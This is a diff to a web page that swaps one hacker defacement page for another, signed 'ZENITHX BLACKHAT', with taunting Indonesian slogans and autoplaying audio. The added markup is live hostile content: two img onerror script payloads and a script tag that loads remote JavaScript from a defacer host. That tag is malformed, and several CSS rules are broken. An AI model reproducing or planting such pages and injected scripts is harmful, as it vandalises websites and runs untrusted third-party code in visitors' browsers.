@@ -1,120 +1,277 @@
-<!DOCTYPE html>
+
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hacked By HANZ XPLOIT</title>
-    <link href="https://fonts.googleapis.com/css2?family=Wallpoet&display=swap" rel="stylesheet">
-    <style>
-        body {
+
+    
+<meta charset="UTF-8">
+
+    
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+<title>
+hacked by zenithx
+</title>
+
+    
+<style>
+
+        @import url('https://fonts.googleapis.com/css2?family=Josefin Sans:wght@400;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Waterfall&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Reggae One&display=swap');
+
+        * {
+            box-sizing: border-box;
             margin: 0;
-            background: black url("https://nathanprinsley-files.prinsh.com/data-1/images/NathanPrinsley-hacked_gif.gif") no-repeat center center fixed;
-            background-size: cover;
-            color: white;
-            font-family: 'Wallpoet', monospace;
-            overflow: hidden;
+            padding: 0;
         }
 
-        #particles-js {
-            position: fixed;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-        }
-
-        .content {
-            position: relative;
-            z-index: 1;
+        body, html {
+            background: #000000;
+            font-family: 'Trebuchet MS', sans-serif;
             text-align: center;
-            padding: 50px 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .main-container {
+            width: 100%
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            animation: fadeIn 1.5s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
 
         .logo {
-    width: 150px;
-    height: 150px;
-    filter: drop-shadow(0 0 10px red);
-    margin-bottom: 20px;
-    border-radius: 50%;
-    object-fit: cover;
+            max-width: 35%
+            height: auto;
+            margin-bottom: 15px;
+            transition: transform 0.3s ease;
+        }
+
+        .logo:hover {
+            transform: scale(1.02);
+        }
+
+        .hacker-signature {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 5px;
+            margin-bottom: 15px;
+            font-size: 1.3rem;
+        }
+
+        .hacker-signature .hacked-by {
+            font-family: 'Reggae One', cursive;
+            color: red;
+        }
+
+        .hacker-signature .hacker-name {
+            font-family: 'Reggae One', cursive;
+            color: white;
+        }
+
+        .divider {
+    width: 80%
+    max-width: 600px;
+    height: 2px;
+    margin: 30px auto;
+    background: linear-gradient(to right, transparent, #ff0000, transparent);
+    border: none;
+    border-radius: 2px;
 }
 
-        h1 {
-            font-size: 3em;
-            color: red;
-            text-shadow: 0 0 20px red;
-            animation: blink 1s step-start infinite;
+
+        .message-container {
+            margin-bottom: 25px;
         }
 
-        .sub-text {
-            margin-top: 20px;
-            font-size: 18px;
-            color: lightgray;
+        .ambatukam-text {
+            color: #FF0000;
+            text-transform: uppercase;
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            text-shadow: 0 0 8px rgba(255, 0, 0, 0.6);
+            letter-spacing: 2px;
+            font-weight: bold;
+            padding: 0 10px;
         }
 
-        .running-text {
-            position: fixed;
-            bottom: 0;
-            width: 100%;
-            white-space: nowrap;
+        .challenge-text {
+            color: #FFFFFF;
+            text-transform: uppercase;
+            font-size: 1.1rem;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            padding: 0 10px;
+        }
+
+        .audio-player {
+            width: 100%
+            max-width: 400px;
+            margin: 0 auto 25px;
+            border-radius: 50px;
             overflow: hidden;
-            background: rgba(0, 0, 0, 0.7);
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
         }
 
-        .running-text span {
-            display: inline-block;
-            padding-left: 100%;
-            animation: scroll 15s linear infinite;
+        .palestine-text {
+            color: #FFFFFF;
+            font-size: 2rem;
+            letter-spacing: 3px;
+            font-family: 'Waterfall', cursive;
+            margin-top: 15px;
+            text-shadow: 0 0 10px rgba(151, 233, 0, 0.7);
+            animation: pulse 2s infinite;
         }
 
-        @keyframes scroll {
-            0% { transform: translateX(0); }
-            100% { transform: translateX(-100%); }
+        @keyframes pulse {
+            0% { text-shadow: 0 0 10px rgba(151, 233, 0, 0.7); }
+            50% { text-shadow: 0 0 20px rgba(151, 233, 0, 1); }
+            100% { text-shadow: 0 0 10px rgba(151, 233, 0, 0.7); }
         }
 
-        @keyframes blink {
-            50% { opacity: 0; }
+        /* Desktop specific styles */
+        @media (min-width: 768px) {
+            .ambatukam-text {
+                font-size: 2.5rem;
+                letter-spacing: 4px;
+            }
+
+            .challenge-text {
+                font-size: 1.3rem;
+                padding: 0 100px;
+            }
+
+            .palestine-text {
+                font-size: 2.8rem;
+                letter-spacing: 5px;
+            }
+
+            .hacker-signature {
+                font-size: 1.5rem;
+            }
         }
-    </style>
+
+        @media (max-width: 767px) {
+            .logo {
+                max-width: 90%
+            }
+
+            .ambatukam-text {
+                font-size: 1.5rem;
+            }
+
+            .challenge-text {
+                font-size: 1rem;
+            }
+
+            .palestine-text {
+                font-size: 1.8rem;
+            }
+
+            .hacker-signature {
+                font-size: 1.1rem;
+                flex-direction: column;
+            }
+        }
+    
+</style>
+
+
 </head>
+
+
 <body>
 
-<audio src="https://nathanprinsley-files.prinsh.com/data-1/mp3/sub-urban_cradles.mp3" autoplay loop></audio>
+    
+<div class="main-container">
 
-<div id="particles-js"></div>
+        
+<img src="https://files.catbox.moe/byyfsx.jpg" alt="Logo" class="logo">
 
-<div class="content">
-    <img src="https://files.catbox.moe/nwttwx.png" class="logo" alt="zenith">
-    <h1>HACKED BY Zenith official</h1>
-    <div class="sub-text">
-        SITUS INI TELAH DI AMBIL ALIH<br>
-        WEBSITE BEEN HACKED BY ZENITH OFFICIAL<br><br>
-        Zenith official | Free palestine
-    </div>
+        
+        
+<div class="hacker-signature">
+
+            
+<span class="hacked-by">
+Hacked By
+</span>
+
+            
+<span class="hacker-name">
+ZENITHX BLACKHAT
+</span>
+
+        
 </div>
 
-<div class="running-text">
-    <span>POWERED BY ZENITH © 2025 — SITUS ANDA SANGAT LEMAH UNTUK DI RETAS — SECURITY IS JUST AN ILLUSION —</span>
-</div>
+        
+        
+<hr class="divider">
 
-<script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
-<script>
-particlesJS("particles-js", {
-    particles: {
-        number: { value: 80 },
-        color: { value: "#ffffff" },
-        shape: { type: "circle" },
-        opacity: { value: 0.5 },
-        size: { value: 3 },
-        line_linked: { enable: true, color: "#ffffff", opacity: 0.4 },
-        move: { enable: true, speed: 2 }
-    },
-    interactivity: {
-        events: { onhover: { enable: true, mode: "repulse" } },
-        modes: { repulse: { distance: 100 } }
-    },
-    retina_detect: true
-});
+        
+        
+<div class="message-container">
+
+            
+<p class="ambatukam-text">
+
+                BLACKHAT
+            
+</p>
+
+            
+<p class="challenge-text">
+
+            KEAMANAN ADALAH MITOS. KERENTANAN ADALAH LOGIKA..
+
+</p>
+            
+            
+            
+<audio controls="" autoplay="" class="audio-player">
+<source src="https://k.top4top.io/m_1644rpx5n1.mp3" type="audio/mpeg"></audio><p class="palestine-text" >zenithx || BLACKHAT</p>
+<img src="x" onerror="alert('Hacked by zenithx')">
+<img src="x" onerror="alert('websitenya lemah banget ')">
+ 
+<script src="<script src="https://jso.defacer.id/raw/d9821cfa">
+
 </script>
 
+</td>
+
+</tr>
+
+</tbody>
+
+</table>
+
+</div>
+
+</div>
+
+</div>
+
+</section>
+
+</div>
+
+</div>
+
 </body>
+
 </html>
